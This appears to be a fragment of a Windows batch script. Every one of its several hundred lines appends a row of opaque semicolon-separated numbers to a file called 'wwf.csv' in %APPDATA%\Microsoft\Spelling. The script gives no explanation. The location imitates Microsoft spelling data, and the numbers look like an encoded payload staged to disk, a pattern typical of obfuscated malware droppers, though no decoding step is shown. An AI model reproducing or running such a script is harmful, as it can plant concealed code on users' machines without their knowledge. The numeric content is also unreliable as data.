>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6817.449;130.735;204.748;130.5897;435.200;36.9;342.134;4199.772;134.947;13.31;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7.3739;72.160;830.35;885.48;0761.830;35.881;2.61;1.7075;349.15;648.13;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(76.9;2375.496;134.672;1.801;3.8882;64.2;61.5;70.48;2742.692;6.310;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(43.56;1.7899;44.1;830.55;32.1;3106.34;160.778;48.476;48.4650;423.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(410.43;46.1;4188.34;1.830;55.62;1.8529;415.48;49.3;41.0;3393.860;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4.862;2.828;0.2413;648.49;748.13;66.9;7103.596;134.372;1.801;3.2486;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(74.2;31.5;40.4;5217.332;222.840;130.495;163.0946;319.122;828.84;901.133;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6293.916;59.786;221.373;58.3549;852.102;613.153;554.195;3513.918;177.547;30.948;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.2716;366.8;748.160;830.13;8861.829;48.830;5.955;48.1932;830.3;931.160;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(73.2;9265.71;2.42;19.451;0.3602;70.1;481.158;841.143;8697.664;113.863;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(14.365;0.4718;50.0;40.1;581.48;7099.713;6.69;42.834;72.2994;834.247;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(713.1;41.11;5587.55;0.348;126.649;11.8412;548.9;66.3;685.4;3855.76;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(19.52;85.783;49.8137;319.48;417.6;33.85;9368.34;8.419;10.387;97.1967;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.104;805.110;803.116;8197.811;110.349;16.648;14.3894;46.3;385.4;37.19;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1560.37;82.801;100.809;111.5511;810.100;349.30;748.28;0426.76;3.685;4.610;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(19.5846;521.77;805.99;814.111;8876.815;111.802;116.732;67.2186;811.114;812.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.97;2384.816;105.811;110.749;40.4528;548.38;76.3;785.4;5827.43;19.431;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(77.805;99.4078;814.111;815.111;802.116;7242.332;67.811;100.801;32.7997;783.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(803.110;805.110;8346.803;32.380;67.365;32.0971;450.48;349.49;748.30;8685.723;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(13.349;57.548;53.8518;348.50;450.49;451.55;6624.652;54.390;23.313;50.8324;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(348.48;653.48;550.50;3108.749;51.355;52.454;90.1802;448.116;549.11;348.9;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9604.76;3.385;4.66;19.5315;62.85;483.49;319.48;7240.517;6.43;85.44;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8.4445;519.10;487.97;815.104;2830.805;110.803;116.811;110.6079;549.16;748.14;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(76.3;2118.785;4.57;19.67;82.6024;801.100;809.111;810.100;0640.649;30.748;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(28.46;3.8351;585.4;610.19;421.77;3442.805;99.814;111.815;111.5581;802.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(432.67;811.114;2953.812;111.814;97.816;105.1119;811.110;449.30;748.28;0751.56;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3.785;4.63;19.4520;721.77;805.99;814.111;1570.815;111.802;116.632;67.1973;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.114;812.111;814.97;5261.816;105.811;110.648;130.5867;61.34;348.13;36.9;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3130.542;134.372;134.947;13.2767;71.1;71.5;40.3;7563.830;1.715;0.648;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(130.7814;41.10;32.130;61.1;6621.40;149.590;198.834;105.7289;671.29;652.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(941.85;4367.895;102.817;246.398;84.8029;424.88;720.103;639.240;0003.863;42.898;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3.472;188.3772;930.86;352.127;473.97;8379.32;238.832;120.802;39.5169;848.86;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(333.44;881.161;4785.936;183.905;59.877;168.5153;882.228;728.7;802.109;2753.929;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.452;83.640;227.8370;911.239;939.83;632.33;9177.347;72.727;241.345;171.6765;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(43.135;938.234;590.159;9964.933;72.871;163.678;115.5997;514.95;759.163;872.251;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1574.593;145.909;13.888;51.1247;649.167;951.124;887.23;1914.805;138.414;122.741;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(86.3817;937.44;518.231;942.227;1971.857;224.899;61.822;51.3716;898.192;895.143;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(844.94;0852.935;251.949;244.825;91.2867;552.73;916.42;484.235;8004.808;16.541;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(136.833;64.1036;899.222;895.165;497.229;5140.951;143.861;121.804;55.9379;821.58;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(949.9;815.239;1256.356;28.579;134.317;155.4943;628.241;938.51;721.164;5381.955;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(238.888;174.872;101.8846;892.113;367.117;860.7;9985.945;164.901;113.924;197.0923;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(866.53;944.128;351.46;3612.873;144.836;248.851;217.1896;838.242;837.30;468.177;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7100.828;106.923;144.779;237.6215;677.121;314.86;809.165;2689.643;54.892;134.519;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(146.7509;364.193;898.19;901.32;7791.350;96.863;6.810;228.9871;808.161;329.218;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(871.178;5795.921;206.842;68.845;2.5418;63.1;30.1;863.130;8391.61;126.348;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(130.71;122.3083;648.31;36.3;685.29;5769.737;4.624;48.722;6.5703;410.43;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(66.1;44.1;7316.830;55.576;8.71;6.8704;48.43;66.1;75.5;3487.47;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3.73;48.729;6.1457;73.85;629.14;44.22;2992.54;20.787;130.426;174.3505;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(774.185;937.235;526.130;8905.938;133.680;22.946;239.5769;570.98;841.207;648.80;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3319.46;3.785;29.617;4.4745;573.48;771.164;469.48;2373.667;49.741;48.339;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.5757;53.85;44.11;319.32;0838.377;105.399;114.811;115.2175;811.102;816.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(379.112;6695.801;114.597;116.805;111.1295;810.115;732.80;817.101;2112.814;116.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.482;105.4104;599.111;549.22;348.20;3922.76;3.485;4.55;19.3666;513.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(751.48;548.49;0319.350;43.652;53.452;49.9061;551.53;648.31;56.3;4007.585;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(29.735;4.324;48.0570;622.128;320.72;810.100;0115.929;80.75;211.830;170.4495;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(523.55;555.34;881.109;0405.868;202.817;2.849;48.1859;684.6;73.85;629.31;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1369.74;77.448;75.748;73.9109;860.71;860.69;834.67;3459.804;116.816;112.558;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(47.4290;447.119;819.119;646.109;6866.805;99.814;111.815;111.9967;802.116;546.99;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.109;7791.347;112.807;105.811;112.3194;815.47;699.114;808.47;1648.777;105.599;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(67.811;100.3871;483.105;803.80;767.65;5475.350;48.549;49.495;50.1231;548.49;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(649.45;348.55;1764.745;48.456;46.799;114.5247;808.48;497.6;58.43;8769.56;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.75;5.57;1.8748;61.4;485.48;783.48;7711.381;6.48;43.36;1.0354;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(55.5;57.48;42.134;4522.669;104.816;116.812;58.3511;347.47;819.119;819.46;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4853.809;105.499;114.811;115.2377;811.102;816.46;699.111;8867.809;47.812;107.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.4448;812.115;747.99;801.114;9172.816;115.547;77.805;99.8515;567.111;800.83;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.103;0736.780;67.565;50.348;49.1511;749.95;450.48;649.49;6782.745;48.655;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(45.648;56.4229;646.99;814.116;348.12;1941.76;3.385;29.619;1.7337;51.255;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(54.2;748.0;3978.748;13.36;9.542;134.0506;672.134;947.13;61.1;7386.611;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5.40;3.830;2.5956;51.0;690.15;828.173;5767.646;0.858;174.902;174.7204;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(836.44;848.132;539.160;8753.893;210.393;67.935;253.3505;526.142;534.18;687.251;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6114.825;142.810;230.655;48.0097;691.221;849.17;537.109;2642.443;18.739;26.909;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(203.7396;943.130;49.151;682.177;5724.939;159.916;10.844;248.0130;695.246;805.140;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(61.14;7050.801;16.809;227.51;242.5795;825.41;596.182;803.56;4241.948;159.869;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(238.952;68.0697;317.246;825.86;808.189;5911.824;114.826;44.919;30.7362;930.214;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(590.133;731.53;4801.811;197.738;86.801;45.3164;824.9;852.93;893.160;1958.891;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4.918;157.561;43.8881;820.90;831.12;955.162;7220.915;10.881;13.826;67.2027;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(843.131;804.230;623.90;2143.587;170.538;178.784;178.6811;813.236;945.72;839.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6158.881;69.910;87.839;253.2881;413.85;929.187;433.161;8719.889;142.778;86.806;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(210.9454;872.210;818.179;53.45;2106.803;97.902;181.414;198.5370;818.126;862.54;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(823.81;0184.912;216.925;89.894;186.8155;836.27;803.214;808.246;5137.904;137.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(14.917;81.0981;547.82;586.6;336.163;4268.44;108.390;254.399;87.6614;837.91;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(869.48;954.180;5165.810;5.906;19.876;113.7408;520.48;817.190;828.243;7534.358;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(118.654;119.826;179.2762;881.93;410.230;45.176;2728.804;8.927;91.856;15.8960;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(902.49;385.247;60.50;2871.649;125.497;126.677;218.6294;906.38;850.217;442.157;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1598.671;183.954;27.785;174.7415;824.74;740.48;748.73;5294.837;98.806;236.818;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(47.2951;884.10;895.230;895.214;0215.565;25.955;154.351;45.6708;525.201;922.56;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(895.146;4122.837;147.872;247.745;162.5523;570.63;541.166;817.170;8079.930;244.653;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(73.930;56.7985;861.254;923.21;410.254;5114.853;86.436;175.71;57.1439;66.46;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(383.184;610.96;8872.826;216.903;213.846;40.9748;917.79;938.146;863.234;1263.446;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(53.939;237.905;107.5917;947.235;534.120;931.6;7610.366;145.58;159.922;97.5754;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(359.193;631.235;357.130;9343.931;179.865;244.622;181.5456;578.27;754.143;927.241;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5516.712;54.890;148.908;247.3905;314.223;850.17;951.241;3338.625;176.819;125.825;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(249.4605;832.230;834.254;911.115;1500.716;219.790;92.873;121.9235;868.248;668.173;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(876.147;4608.822;88.914;132.879;216.8928;847.196;928.243;810.54;0108.803;125.726;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(103.950;161.9582;927.217;831.46;900.139;6556.910;75.346;175.318;157.6476;766.213;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(937.191;836.63;3598.769;23.669;143.806;248.3876;803.81;840.205;828.17;9562.826;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(166.877;155.939;60.7561;334.40;527.70;852.29;4404.611;189.893;155.710;16.2001;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(873.163;870.245;862.243;7157.952;93.821;231.846;35.3154;909.77;932.173;812.226;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6463.833;80.651;131.348;130.6243;57.122;448.130;75.98;4781.860;3.42;1.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2.8082;410.97;514.144;910.0;6021.60;0.70;0.73;48.4295;713.6;69.42;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(834.72;1127.834;247.413;1.71;11.2610;55.0;648.129;836.49;3680.711;48.79;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.43;85.1070;74.6;519.2;485.83;5017.749;19.748;17.36;3.3401;385.4;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.19;610.87;3941.397;115.804;105.810;103.9053;816.111;810.49;516.48;2920.414;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.43;85.64;7.7599;419.7;482.101;800.109;8915.811;110.800;49.530;48.8245;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(528.6;73.85;44.10;2207.319;21.677;105.399;114.7640;811.115;811.102;816.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4248.767;111.814;112.811;114.1003;497.116;805.111;810.49;9663.650;48.448;6.53;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(85.1990;44.3;619.41;477.105;0036.499;114.811;115.811;102.0044;816.32;582.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.116;1880.632;67.801;114.816;105.3206;802.105;699.97;816.101;0496.732;65.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.804;111.5086;814.105;816.121;732.50;8060.348;49.449;48.630;23.0901;313.49;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(649.48;755.48;8964.456;50.648;53.457;48.9666;357.90;723.13;350.54;8781.748;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(55.648;56.750;49.2892;348.57;348.57;690.48;6925.826;49.311;48.79;6.9918;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(73.85;74.6;419.2;2622.685;83.349;19.748;17.2859;76.3;685.4;58.19;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5165.610;87.397;115.804;105.3964;810.103;816.111;810.49;8154.516;48.314;6.73;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(85.7030;34.7;419.7;382.101;2472.800;109.811;110.800;49.1920;630.48;328.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(33.85;0522.44;10.619;21.777;105.4481;499.114;811.115;811.102;2946.816;32.767;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.814;112.9865;811.114;697.116;805.111;8503.810;49.340;48.638;6.5854;73.85;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(74.3;519.31;7704.577;105.599;114.811;115.9291;811.102;816.32;767.111;0166.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.532;83.805;103.1057;810.105;810.103;632.80;2703.467;65.632;50.348;49.1065;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(449.48;830.2;534.48;7968.513;6.59;42.834;72.3681;834.247;513.1;41.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2005.35;0.33;130.42;15.5318;60.48;830.2;410.2;5412.830;2.51;0.871;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(240.7950;950.114;716.28;346.173;4268.916;110.870;130.716;77.0004;752.186;942.182;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(688.33;5973.859;66.427;42.807;233.3486;390.80;870.184;56.56;4628.526;4.473;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(186.827;195.5820;712.30;921.55;807.198;1786.618;216.711;240.656;194.6879;853.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(876.200;657.213;5228.61;20.349;66.911;137.6664;313.121;800.135;826.148;6285.396;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(36.808;175.858;73.2405;856.233;804.94;910.223;4180.855;83.878;10.544;195.6945;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(875.217;869.43;874.122;0963.59;175.915;150.389;202.6512;496.26;55.233;802.118;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9465.932;50.682;38.318;47.1638;931.171;48.80;907.179;0923.768;183.793;216.896;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(46.7858;53.117;871.104;943.203;4567.809;243.358;92.861;22.2994;944.70;886.224;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(556.100;9430.872;110.800;53.820;166.5829;860.99;415.45;911.64;3596.847;248.927;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(222.67;13.7888;913.92;821.165;673.41;0313.931;13.890;160.519;119.5910;890.148;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(661.239;951.227;5440.343;90.416;31.577;86.0800;640.162;822.114;924.18;8955.358;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(183.473;94.916;237.9141;937.67;845.131;917.123;9059.878;123.834;27.917;62.4839;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(877.140;793.232;837.79;2012.832;26.942;161.647;89.6330;928.144;359.45;874.51;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6379.388;197.883;62.954;50.7445;911.179;73.61;877.178;3348.875;146.756;126.910;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(157.3716;828.44;945.78;586.145;1590.633;53.737;195.457;110.5807;800.127;783.186;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(856.15;7188.873;25.435;132.903;244.5914;886.3;834.141;947.95;8313.940;208.382;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(191.840;148.5015;835.188;892.33;816.37;9201.395;24.740;182.904;39.1507;340.56;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(737.152;657.74;0830.454;207.824;177.846;174.2527;528.35;867.169;802.236;0014.597;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(31.806;225.440;73.0505;857.95;836.226;737.93;2678.911;33.775;62.682;196.8235;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(881.87;663.36;43.240;3650.909;122.591;47.913;35.3892;927.112;393.15;481.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8731.819;179.948;0.925;188.3224;872.2;830.95;919.192;6141.621;179.889;27.912;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(85.4720;475.231;357.161;415.233;1853.335;73.888;24.884;68.7989;824.69;928.193;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(895.114;7515.822;224.814;231.536;223.9304;891.70;853.197;939.194;1179.528;87.919;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(131.841;236.6202;377.73;748.167;871.142;5088.923;236.791;159.875;252.0708;921.176;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(802.226;893.151;0332.829;123.937;214.937;75.6046;931.73;541.167;619.40;7929.866;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(167.825;103.828;230.0291;838.98;820.95;878.47;0560.832;215.587;156.692;191.0646;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(819.40;540.241;937.109;6966.895;40.843;44.843;64.9875;755.79;893.225;833.68;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3225.837;196.59;76.897;212.6777;865.67;547.116;849.247;0315.810;248.820;32.588;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(44.9228;319.93;696.149;854.62;0269.679;51.832;218.876;136.5477;623.222;858.78;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(944.150;3659.876;188.670;160.808;152.1070;910.224;914.136;840.11;6031.72;3.51;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.41;163.5554;830.1;937.48;830.1;0420.933;48.616;6.59;43.8554;46.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(64.1;830.55;0345.521;1.74;3.62;1.0444;50.48;629.6;53.85;3207.329;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(14.64;22.44;20.7050;772.110;800.229;780.5;4234.911;130.870;23.555;55.9470;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(334.181;809.168;902.117;9352.62;149.648;25.36;9.0046;743.6;31.4;71.130;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8812.555;20.52;4.412;30.3828;710.0;483.0;817.0;5584.698;0.767;0.765;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.0465;411.6;53.85;429.15;0829.74;4.33;2.71;134.8594;348.15;76.3;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(685.29;5113.619;1.61;255.44;5.6333;648.3;51.1;955.48;7926.731;6.63;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(85.729;35.0347;34.24;448.22;828.20;0559.814;45.758;2.549;144.9293;767.185;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(520.5;578.225;7684.934;167.899;49.909;35.8549;837.52;748.90;56.3;9674.485;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(29.731;4.583;48.2021;781.48;379.160;677.160;8002.775;134.373;104.816;116.6391;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.58;447.47;499.114;0274.808;46.809;105.699;114.1704;811.115;811.102;816.46;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8742.399;111.809;47.812;107.6688;805.47;499.114;808.47;9211.812;114.811;100.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(99.1334;816.115;547.77;805.99;0874.582;111.811;67.801;114.5692;565.117;816.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(448.49;2991.749;95.350;48.749;49.4200;795.48;651.95;550.50;1123.746;99.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(108.348;94.0426;56.8;543.6;31.5;9248.75;7.51;1.44;82.9234;548.80;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(548.78;56.8;1586.643;6.61;5.55;7.9343;348.2;834.66;804.116;8723.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.458;47.547;119.0834;819.119;446.109;805.99;7255.814;111.815;111.802;116.8473;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(446.99;811.109;347.112;8926.807;105.547;99.801;114.2997;816.115;547.77;805.99;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8950.382;111.811;67.801;114.0444;565.117;816.50;548.49;1111.649;95.550;48.649;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(49.9869;595.48;751.95;650.50;2975.346;99.814;116.448;129.4333;859.6;33.85;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(329.32;9182.34;129.851;48.829;148.7339;348.129;845.6;69.43;0258.46;1.34;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.830;55.7657;746.3;648.129;831.48;0694.763;6.78;43.46;1.8395;55.5;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(67.2;31.22;2545.551;104.816;116.812;58.3957;747.47;819.119;819.46;7795.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.599;114.811;115.6659;811.102;816.46;699.111;9185.809;47.812;107.805;111.5410;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.115;547.100;811.99;2733.815;47.812;114.805;109.0865;497.114;821.99;812.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9996.546;104.816;109.548;64.7881;56.8;743.6;61.5;9092.45;7.52;2.648;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(52.7007;330.50;732.29;40.76;0854.40;101.60;103.50;97.8054;30.108;50.95;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.112;7439.30;111.70;108.70;105.2081;30.99;50.121;40.95;3503.60;115.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.70;97.8057;30.116;50.101;60.109;1602.40;101.70;110.30;116.3063;50.46;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(632.29;748.13;0951.36;9.342;134.672;134.6127;947.13;71.1;711.5;8597.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3.830;2.41;0.2346;803.242;834.165;852.224;2495.684;121.526;46.911;216.2646;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.103;534.155;611.150;4512.417;225.399;146.853;66.4644;850.125;910.121;412.144;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2786.893;101.595;46.344;62.4903;948.195;814.209;809.131;4231.954;190.663;232.310;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(202.4921;759.191;371.169;863.243;2841.805;219.699;191.734;53.7654;865.151;693.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(832.144;7701.825;139.370;80.685;216.8673;412.146;824.210;426.75;6422.728;243.460;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(66.839;82.6834;908.176;953.107;927.62;1045.67;46.641;155.930;61.9265;727.165;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(912.181;729.119;6288.848;57.926;233.800;201.0143;468.61;820.122;635.243;9459.319;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(125.866;144.816;131.3509;841.244;903.38;52.70;8411.642;194.838;16.887;164.2071;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(869.5;312.155;937.104;2873.950;104.546;149.860;42.9566;363.42;807.88;573.99;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4938.431;9.805;110.490;152.2844;850.228;831.244;892.143;5111.943;70.543;222.952;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(59.9837;908.189;553.239;810.37;1736.874;229.875;39.937;208.6661;921.243;314.175;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(853.40;6460.851;152.777;14.561;11.9706;942.8;837.214;431.195;8295.750;24.926;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(240.897;45.6845;906.91;858.180;673.57;3949.410;198.310;194.898;173.6263;874.229;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(878.217;919.21;6397.836;81.469;88.656;50.4812;813.39;326.127;877.244;1247.539;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(248.922;44.458;32.6788;805.152;878.89;837.104;0915.810;111.867;183.816;195.2855;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(664.5;36.166;61.42;0232.740;62.830;63.719;77.0557;802.11;892.179;377.245;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4617.925;143.827;28.811;21.8896;825.69;867.118;929.64;4065.342;101.863;195.793;
